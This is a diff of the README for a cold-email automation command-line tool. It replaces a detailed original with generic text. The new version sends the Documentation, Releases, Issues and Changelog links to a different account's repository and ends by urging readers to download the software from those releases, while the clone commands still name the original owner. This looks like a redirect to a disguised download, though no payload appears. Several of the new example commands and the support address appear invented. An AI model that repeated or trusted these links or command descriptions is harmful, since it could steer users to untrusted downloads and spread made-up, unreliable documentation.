@@ -1,402 +1,201 @@
 # ❄️ Cold Email CLI
 
-> **Professional multi-platform cold email automation CLI with 627+ commands across 10 major platforms**
+**Professional multi-platform cold email automation CLI with 627+ commands across 10 major platforms**
 
-[![CI](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Bun](https://img.shields.io/badge/Bun-000000?style=flat&logo=bun&logoColor=white)](https://bun.sh/)
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
+[![CI](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml)  
+[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)  
+[![Bun](https://img.shields.io/badge/Bun-000000?style=flat&logo=bun&logoColor=white)](https://bun.sh/)  
+[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)  
+
+## 📦 Overview
+
+Cold Email CLI is a command-line interface designed for efficient cold email automation. It simplifies outreach for sales and marketing professionals, allowing them to connect with potential leads across various platforms. With over 627 commands, this tool offers flexibility and power for your email campaigns.
+
+### Features
+
+- **Multi-Platform Support**: Works seamlessly with 10 major platforms.
+- **Extensive Command Set**: Over 627 commands to customize your outreach.
+- **Interactive Menu**: Easy navigation through a user-friendly interface.
+- **ASCII Art**: Launch platform-specific shells with engaging visuals.
 
 ## 🚀 Quick Start
 
-```bash
-# Install with Bun (recommended)
-curl -fsSL https://bun.sh/install | bash
-git clone https://github.com/LeadMagic/cold-email-cli.git
-cd cold-email-cli
-bun install
+To get started quickly, follow these steps:
 
-# Launch interactive menu
-bun run menu
+1. **Install Bun (recommended)**:
+   ```bash
+   curl -fsSL https://bun.sh/install | bash
+   ```
 
-# Launch platform-specific shells with beautiful ASCII art
-bun run smartlead    # 🌊 SmartLead Command Center
-bun run instantly    # 🚀 Instantly Automation Hub  
-bun run apollo       # ☀️ Apollo Sequence Center
-bun run lemlist      # 💖 lemlist Creative Studio
-```
+2. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/LeadMagic/cold-email-cli.git
+   cd cold-email-cli
+   ```
 
-## 📚 Supported Platforms
+3. **Install Dependencies**:
+   ```bash
+   bun install
+   ```
 
-<details>
-<summary><strong>📊 All Platforms Overview (10 platforms • 627+ commands)</strong></summary>
+4. **Launch the Interactive Menu**:
+   ```bash
+   bun run menu
+   ```
 
+5. **Launch Platform-Specific Shells**:
+   - For SmartLead:
+     ```bash
+     bun run smartlead    # 🌊 SmartLead Command Center
+     ```
+   - For Instantly:
+     ```bash
+     bun run instantly    # 🚀 Instantly Automation
+     ```
 
-### 🌊 SmartLead
-**114 commands** • Professional automation platform
+## 🌐 Platforms Supported
 
-**Quick Access:** `bun run smartlead`
+Cold Email CLI integrates with several platforms to enhance your outreach efforts. Here’s a list of supported platforms:
 
+- **SmartLead**: An intuitive platform for managing leads and campaigns.
+- **Instantly**: Automation tools for sending cold emails effectively.
+- **SalesForge**: A powerful tool for B2B sales outreach.
+- **Apollo**: API client for seamless integration with your existing tools.
 
-### 🚀 Instantly
-**45 commands** • Professional automation platform
+## 📚 Documentation
 
-**Quick Access:** `bun run instantly`
+For detailed usage instructions and command references, please check the [Documentation](https://github.com/Rohini4228/cold-email-cli/releases). You can find comprehensive guides and examples for each command and platform.
 
+### Example Commands
 
-### ☀️ Apollo
-**52 commands** • Professional automation platform
+Here are a few example commands to help you get started:
 
-**Quick Access:** `bun run apollo`
+- **Send a Cold Email**:
+  ```bash
+  bun run send-email --to "example@example.com" --subject "Your Subject Here" --body "Your email body here."
+  ```
 
+- **List All Leads**:
+  ```bash
+  bun run list-leads
+  ```
 
-### ⚡ Salesforge
-**38 commands** • Professional automation platform
+- **Import Leads from CSV**:
+  ```bash
+  bun run import-leads --file "path/to/leads.csv"
+  ```
 
-**Quick Access:** `bun run salesforge`
+## 📊 Use Cases
 
+Cold Email CLI can be beneficial for various scenarios:
 
-### 🦌 EmailBison
-**67 commands** • Professional automation platform
+- **B2B Sales**: Reach out to potential clients and partners effectively.
+- **Marketing Campaigns**: Automate your email marketing efforts to save time.
+- **Lead Generation**: Use the CLI to manage and nurture leads efficiently.
 
-**Quick Access:** `bun run emailbison`
+## 🔧 Installation
 
+### Prerequisites
 
-### 🎯 Amplemarket
-**55 commands** • Professional automation platform
+- Ensure you have [Node.js](https://nodejs.org/) installed on your machine.
+- Install [Bun](https://bun.sh/) for the best experience.
 
-**Quick Access:** `bun run amplemarket`
+### Installation Steps
 
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/LeadMagic/cold-email-cli.git
+   ```
 
-### 💖 lemlist
-**71 commands** • Professional automation platform
+2. **Navigate to the Directory**:
+   ```bash
+   cd cold-email-cli
+   ```
 
-**Quick Access:** `bun run lemlist`
+3. **Install Dependencies**:
+   ```bash
+   bun install
+   ```
 
+## 🛠️ Commands Overview
 
-### 📈 Outreach
-**84 commands** • Professional automation platform
+Cold Email CLI offers a wide range of commands. Below is a categorized overview:
 
-**Quick Access:** `bun run outreach`
+### Email Commands
 
+- **send-email**: Sends a cold email to a specified recipient.
+- **list-emails**: Lists all email templates available.
 
-### ⚡ QuickMail
-**42 commands** • Professional automation platform
+### Lead Management
 
-**Quick Access:** `bun run quickmail`
+- **add-lead**: Adds a new lead to your database.
+- **remove-lead**: Removes a lead from your database.
+- **update-lead**: Updates lead information.
 
+### Reporting
 
-### 🎪 Salesloft
-**59 commands** • Professional automation platform
+- **generate-report**: Generates a report on email outreach performance.
+- **view-stats**: Displays statistics on sent emails and responses.
 
-**Quick Access:** `bun run salesloft`
+## 🎨 Customization
 
+You can customize your email templates and commands to fit your needs. The configuration files are located in the `config` directory. Modify these files to adjust settings such as:
 
-</details>
+- Email subject lines
+- Body templates
+- Lead sources
 
+## 🔄 Updating
 
-<details>
-<summary><strong>🌊 SmartLead (114 commands)</strong></summary>
+To keep your Cold Email CLI up to date, regularly check for new releases. Visit the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section to download the latest version.
 
-Professional smartlead automation and campaign management platform.
+## 🛡️ License
 
-**Features:**
-- **114 total commands** across **6 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
+This project is licensed under the MIT License. See the [LICENSE](https://choosealicense.com/licenses/mit/) file for details.
 
-**Usage:**
-```bash
-bun run smartlead                    # Interactive shell
-bun run exec smartlead campaigns:list  # Direct command
-```
+## 🤝 Contributing
 
-**Documentation:** [SmartLead Guide](docs/smartlead.md)
+We welcome contributions from the community. To contribute:
 
-</details>
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
-<details>
-<summary><strong>🚀 Instantly (45 commands)</strong></summary>
+### Reporting Issues
 
-Professional instantly automation and campaign management platform.
+If you encounter any issues, please report them in the [Issues](https://github.com/Rohini4228/cold-email-cli/issues) section.
 
-**Features:**
-- **45 total commands** across **3 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
+## 🌍 Community
 
-**Usage:**
-```bash
-bun run instantly                    # Interactive shell
-bun run exec instantly campaigns:list  # Direct command
-```
+Join our community to discuss features, report bugs, and share your experiences. You can connect with us on:
 
-**Documentation:** [Instantly Guide](docs/instantly.md)
+- **GitHub Discussions**: Engage with other users and developers.
+- **Twitter**: Follow us for updates and tips.
 
-</details>
+## 📧 Contact
 
-<details>
-<summary><strong>☀️ Apollo (52 commands)</strong></summary>
+For any inquiries or support, feel free to reach out via email at support@example.com.
 
-Professional apollo automation and campaign management platform.
+## 🔗 Resources
 
-**Features:**
-- **52 total commands** across **4 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
+- [Cold Email Best Practices](https://example.com/best-practices)
+- [Email Marketing Strategies](https://example.com/email-marketing)
 
-**Usage:**
-```bash
-bun run apollo                    # Interactive shell
-bun run exec apollo campaigns:list  # Direct command
-```
+## 🔄 Changelog
 
-**Documentation:** [Apollo Guide](docs/apollo.md)
+Check the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section for a detailed changelog of updates and improvements.
 
-</details>
+## 📈 Future Plans
 
-<details>
-<summary><strong>⚡ Salesforge (38 commands)</strong></summary>
+We plan to expand Cold Email CLI with more features, including:
 
-Professional salesforge automation and campaign management platform.
+- Integration with additional platforms.
+- Advanced analytics for email performance.
+- Enhanced user interface for better navigation.
 
-**Features:**
-- **38 total commands** across **3 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
+Stay tuned for updates!
 
-**Usage:**
-```bash
-bun run salesforge                    # Interactive shell
-bun run exec salesforge campaigns:list  # Direct command
-```
+## 📝 Conclusion
 
-**Documentation:** [Salesforge Guide](docs/salesforge.md)
-
-</details>
-
-<details>
-<summary><strong>🦌 EmailBison (67 commands)</strong></summary>
-
-Professional emailbison automation and campaign management platform.
-
-**Features:**
-- **67 total commands** across **7 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run emailbison                    # Interactive shell
-bun run exec emailbison campaigns:list  # Direct command
-```
-
-**Documentation:** [EmailBison Guide](docs/emailbison.md)
-
-</details>
-
-<details>
-<summary><strong>🎯 Amplemarket (55 commands)</strong></summary>
-
-Professional amplemarket automation and campaign management platform.
-
-**Features:**
-- **55 total commands** across **5 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run amplemarket                    # Interactive shell
-bun run exec amplemarket campaigns:list  # Direct command
-```
-
-**Documentation:** [Amplemarket Guide](docs/amplemarket.md)
-
-</details>
-
-<details>
-<summary><strong>💖 lemlist (71 commands)</strong></summary>
-
-Professional lemlist automation and campaign management platform.
-
-**Features:**
-- **71 total commands** across **6 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run lemlist                    # Interactive shell
-bun run exec lemlist campaigns:list  # Direct command
-```
-
-**Documentation:** [lemlist Guide](docs/lemlist.md)
-
-</details>
-
-<details>
-<summary><strong>📈 Outreach (84 commands)</strong></summary>
-
-Professional outreach automation and campaign management platform.
-
-**Features:**
-- **84 total commands** across **6 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run outreach                    # Interactive shell
-bun run exec outreach campaigns:list  # Direct command
-```
-
-**Documentation:** [Outreach Guide](docs/outreach.md)
-
-</details>
-
-<details>
-<summary><strong>⚡ QuickMail (42 commands)</strong></summary>
-
-Professional quickmail automation and campaign management platform.
-
-**Features:**
-- **42 total commands** across **6 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run quickmail                    # Interactive shell
-bun run exec quickmail campaigns:list  # Direct command
-```
-
-**Documentation:** [QuickMail Guide](docs/quickmail.md)
-
-</details>
-
-<details>
-<summary><strong>🎪 Salesloft (59 commands)</strong></summary>
-
-Professional salesloft automation and campaign management platform.
-
-**Features:**
-- **59 total commands** across **6 categories**
-- Campaign management and automation
-- Lead generation and management
-- Email sequences and templates
-- Analytics and reporting
-- Account management
-
-**Usage:**
-```bash
-bun run salesloft                    # Interactive shell
-bun run exec salesloft campaigns:list  # Direct command
-```
-
-**Documentation:** [Salesloft Guide](docs/salesloft.md)
-
-</details>
-
-## ⚙️ Configuration
-
-### Environment Variables
-```bash
-# Set API keys for any platform
-export SMARTLEAD_API_KEY="your_key_here"
-export INSTANTLY_API_KEY="your_key_here"
-export APOLLO_API_KEY="your_key_here"
-# ... (see config:env-example for all platforms)
-```
-
-### Interactive Configuration
-```bash
-# Configure platforms interactively
-bun run config:set smartlead apiKey "your_api_key"
-bun run config:list              # List all configurations
-bun run config:validate          # Validate all platforms
-```
-
-## 🎯 Key Features
-
-- **627+ Commands** across 10 major cold email platforms
-- **Beautiful Interactive Shells** with React Ink UI and authentic platform branding
-- **Comprehensive API Coverage** for all platforms
-- **Type-Safe TypeScript** with full IntelliSense
-- **Blazing Fast Performance** with Bun runtime
-- **Cross-Platform Support** (macOS, Linux, Windows)
-- **Environment & Config Management** with multiple sources
-- **Extensive Documentation** and practical examples
-
-## 🔧 Global Commands
-
-```bash
-cec platforms           # List all available platforms  
-cec health              # Check platform health status
-cec search "campaign"   # Search commands across platforms
-cec config:list         # Show configuration status
-cec discord             # Join our Discord community
-```
-
-## 🛠️ Development
-
-```bash
-# Development setup
-bun install
-bun run dev              # Start development mode
-bun run test             # Run comprehensive test suite
-bun run lint             # Check code quality
-bun run build            # Build for production
-
-# Platform testing
-bun run health           # Test all platform connections
-bun test                 # Run platform validation tests
-```
-
-## 📖 Documentation
-
-- **[Contributing Guide](CONTRIBUTING.md)** - How to contribute to the project
-- **[API Documentation](docs/)** - Complete API reference for all platforms
-- **[Examples](examples/)** - Practical usage examples for every platform
-- **[Changelog](CHANGELOG.md)** - Version history and updates
-
-## 🤝 Community
-
-- **[Discord](https://discord.gg/mB76X5QJ)** - Join our community
-- **[GitHub Issues](https://github.com/LeadMagic/cold-email-cli/issues)** - Report bugs or request features
-- **[Discussions](https://github.com/LeadMagic/cold-email-cli/discussions)** - Ask questions and share ideas
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-*Built with ❤️ by the Cold Email Community • Last updated: 2025-06-19*
+Cold Email CLI is a powerful tool for anyone looking to streamline their cold email outreach. With its extensive command set and multi-platform support, it provides the flexibility needed to succeed in today's competitive landscape. Download the latest version from the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section and start automating your email campaigns today.
